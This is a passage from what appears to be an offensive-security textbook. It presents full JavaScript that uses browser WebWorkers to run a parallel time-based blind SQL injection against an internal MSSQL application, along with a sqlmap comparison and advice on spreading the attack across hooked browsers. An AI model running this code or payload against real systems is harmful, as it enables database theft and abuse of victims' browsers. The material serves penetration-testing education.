@@ -1,0 +1,154 @@
+
+if(!!window.Worker){
+
+// WebWorker code location
+var wwloc = "http://browserhacker.com/time-based-sqli/worker.js";
+// to init WebWorker
+var uri = "http://172.16.37.149";
+var port = "8080";
+var path = "/?book_id=1";
+var payload = " IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME()" +
+ " AS NVARCHAR(4000)),CHAR(32))),";
+var timeDelay = 2; // seconds to delay the response
+var position = 1;
+// Array holding the retrieved chars
+var dbname = [];
+var dbname_string = "";
+// internal vars
+var dataLength = 0;
+var workersDone = 0;
+var successfulWorkersDone = 0;
+
+// Number of WebWorkers to spawn in parallel
+// (1 WebWorker handles 1 char position)
+var workers_number = 5;
+// every 1 second calls checkComplete()
+var checkCompleteDelay = 1000;
+var start = new Date().getTime();
+
+/* Iterates through dbname, converting characters
+from Decimal to Char representation */
+function finish(){
+ dbname.shift(); // removes the first 0 index
+ for(var i=0; i<dbname.length; i++){
+  dbname_string += String.fromCharCode(dbname[i]);
+ }
+ console.log("Database name is: " + dbname_string);
+ var end = new Date().getTime();
+ console.log("Total time [" + (end-start)/1000 + "] seconds.");
+}
+/* Spawn new WebWorkers to handle data retrieval at 'start' position */
+function spawnWorkers(start, end){
+ for(var i=start; i<=end; i++){
+ 
+// using eval to create WebWorker variables dynamically
+ eval("var w" + i + " = new Worker('" + wwloc + "');");
+ 
+/* When we get a message from a WebWorker, check which character
+ at which position has been retrieved, and add it to the 'dbname'
+ Array. If the message contains 'end' it means the WebWorker was
+ querying an out of bound position (potentially 'dataLength')*/
+ eval("w" + i + ".onmessage = function(oEvent){" +
+ "var c = oEvent.data['char'];var p = oEvent.data['position'];" +
+ "workersDone++;" +
+ "if(oEvent.data['end']){if(dataLength==0){dataLength=p-1;}; " +
+ "if(dataLength !=0 && dataLength > (p-1)){dataLength=p-1;};}else{" +
+   "successfulWorkersDone++;" +
+   " console.log('Retrieved char ['+c+'] at position ['+p+']');" +
+   "dbname[p]=c; console.log('Workers done [' + workersDone + ']." +
+   " DataLength ['+dataLength+']');}}; ");
+ eval("var data = {'uri':'" + uri + "', 'port':" + port +
+  ", 'path':'" + path +"', 'payload':'" + payload +
+  "', 'index':0,'seconds':" + timeDelay + ",'position':" + i + "};");
+ eval("w" + i + ".postMessage(data);");
+
+ position++;
+ }
+}
+
+/* Every N seconds (defined in 'checkCompleteDelay') check if
+WebWorkers have completed, and eventually spawn more of them,
+or call finish()*/
+function checkComplete(){
+ if(workersDone == workers_number){
+ console.log("Successful workers done ["+successfulWorkersDone+"]");
+
+ /* all spawned workers are complete, check if we reached dataLength,
+  or spawn more dataLength == 0 means we still need to identify the
+  length of the data to be retrieved */
+  if((dataLength != 0 && successfulWorkersDone !=0)
+    && successfulWorkersDone == dataLength){
+   console.log("Finishing...");
+   clearInterval(checkCompleteInterval);
+   finish();
+  }else{
+   // spawn additional workers
+   console.log("Spawned other [" + workers_number + "] workers.");
+   workersDone = 0;
+   spawnWorkers(position, position+(workers_number-1));
+  }
+ }else{
+  console.log("Waiting for workers to complete..." +
+   "Successful workers done ["+successfulWorkersDone+"]");
+ }
+}
+
+// first call
+spawnWorkers(position, workers_number);
+
+var checkCompleteInterval = setInterval(function(){
+  checkComplete()}, checkCompleteDelay);
+
+}else{
+console.log("WebWorker not supported!");
+}
+```
+
+The target is an internal network web application available at 172.16.37.149:8080. After identifying that the base HTTP response time for the / resource is always less than 0.2 seconds, you can be confident using a time delay of 2 seconds (timeDelay variable). The number of workers used in parallel defaults to 5, but can be altered using the workers_number variable. The code executed by each WebWorker needs to be loaded from the same-origin that loads the controller code, and can be configured through the wwloc variable.
+
+When spawnWorkers() is called, initially with position 1 (because you need to retrieve the first character of the database name), it creates five WebWorkers. Each worker focuses on retrieving the character at a specified position. The first works on position 1, the second on position 2, and so on. At the same time, the checkComplete() function is called every second. This function is responsible for checking how many workers completed their jobs successfully, and if the end of the database name was reached.
+
+One way to discover the length of the data to be retrieved is to issue seven requests for an out-of-bounds position, and check if they were all delayed. MSSQL doesn’t allow null characters in the database names, so this makes the process more straightforward. In this case the length of the database called sql_InjEction_1234 is 18, so if all the seven requests to retrieve the character at position 19 are not delayed, it means you have reached the end of the data.
+
+More workers are spawned until dataLength is known. When dataLength has been discovered, and all workers completed, the interval used to call checkComplete() is cleared, and the database name value is reconstructed. The dbname array contains all the retrieved characters in their decimal representation. You just need to iterate through it and call String.fromCharCode(char) to have the string representation. This task is executed by the finish() function.
+
+The result of executing this technique with five workers in parallel, using time delays of 2 seconds, and having a base response time of 0.2 seconds, can be seen in [Figure 9-13](#c09.html#figure9-13). In just 44 seconds, the database name is retrieved.
+
+ start figure 
+
+[**Figure 9-13:**](#c09.html#figureanchor9-13) Five WebWorkers retrieving database name in Chrome
+
+![c09f013.tif](image_fi/662090c09/c09f013.png)
+
+ end figure 
+
+Trying the same with 10 workers reduces the total retrieval time to 30 seconds, as you can see in [Figure 9-14](#c09.html#figure9-14).
+
+ start figure 
+
+[**Figure 9-14:**](#c09.html#figureanchor9-14) Ten WebWorkers retrieving database name in Firefox
+
+![c09f014.tif](image_fi/662090c09/c09f014.png)
+
+ end figure 
+
+Starting Sqlmap with the same time-delay settings as the cross-origin demonstration earlier, it takes almost 140 seconds to retrieve the same results:
+
+```
+./sqlmap.py -u "http://172.16.37.149:8080/?book_id=1"
+ -p book_id --dbms "mssql" --technique T --time-sec=2
+ -v 3 --current-db --threads 5
+[19:53:56] [DEBUG] performed 151 queries in 139.56 seconds
+current database:    'sql_InjEction_1234'
+```
+
+Although five threads are specified, Sqlmap disabled multithreading when dealing with time-based blind SQL injection. All the requests are effectively sent in sequential order.
+
+Additionally, if you are controlling a browser in the internal network while targeting an internal web application, the communication latency will be less and the reliability will be higher. This means you can reduce the time-delay used in the SQL to get better efficiencies on discovery and data egress.
+
+Taking this to the next level, you could even split the job of sending requests to the same target and reconstructing bytes across multiple hooked browsers. You can then reconstruct, on the server-side, data arriving from the browsers. The full code of the distributed time-based SQL injection can be found on [https://browserhacker.com](https://browserhacker.com).
+
+In this section, you have explored techniques to exploit SQL injection vulnerabilities. Now, you will examine Cross-site Scripting vulnerabilities and how you can exploit these from the browser.
+
+## Detecting Cross-site Scripting Vulnerabilities
+
